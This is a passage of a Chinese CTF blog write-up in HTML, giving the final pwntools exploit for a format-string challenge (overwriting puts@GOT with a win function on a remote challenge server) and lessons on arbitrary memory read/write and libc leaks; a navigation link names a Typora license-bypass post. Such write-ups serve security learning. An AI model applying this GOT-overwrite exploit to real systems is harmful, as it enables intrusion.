+<h2 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./out&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;nc.umbccd.net&#x27;</span>, <span class="number">8925</span>)</span><br><span class="line"></span><br><span class="line">win  = <span class="number">0x401196</span>   <span class="comment"># 来自远程 .text dump（不是本地的 0x401216）</span></span><br><span class="line">puts = <span class="number">0x404000</span>   <span class="comment"># puts@GOT</span></span><br><span class="line">pay  = fmtstr_payload(<span class="number">6</span>, &#123;puts: win&#125;)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>发送 payload 后，<code>printf</code> 把 <code>puts@GOT</code> 改写为 <code>win</code>，紧接着的 <code>puts(&quot;\nGoodbye!&quot;)</code> 跳入 <code>win()</code>，打印 flag。</p>
+<h2 id="总结-经验"><a href="#总结-经验" class="headerlink" title="总结 &#x2F; 经验"></a>总结 &#x2F; 经验</h2><ol>
+<li><strong>格式化字符串 &#x3D; 任意读 + 任意写</strong>，一个漏洞既能写 GOT 劫持控制流，也能 <code>%s</code> 把远程内存整段 dump 下来。</li>
+<li>题目不给二进制 + 自行编译时，<strong>绝不能假设本地地址等于远程地址</strong>。即便 <code>-no-pie</code>，不同编译产物的函数偏移也会变。务必用泄露&#x2F; dump 拿到远程真实地址。</li>
+<li>dump GOT 还能顺带白嫖 libc 基址，是没有 <code>win</code> 时的通用后备方案。</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+              <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"># 格式化字符串</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/03/10/adrift/" rel="prev" title="HGAME2026 adrift">
+                  <i class="fa fa-angle-left"></i> HGAME2026 adrift
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/06/13/typora-license-bypass-macos/" rel="next" title="Typora 激活逻辑逆向 (macOS)">
+                  Typora 激活逻辑逆向 (macOS) <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">CuO</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script src="/js/enhance.js" defer></script>
+
+</body>
+</html>
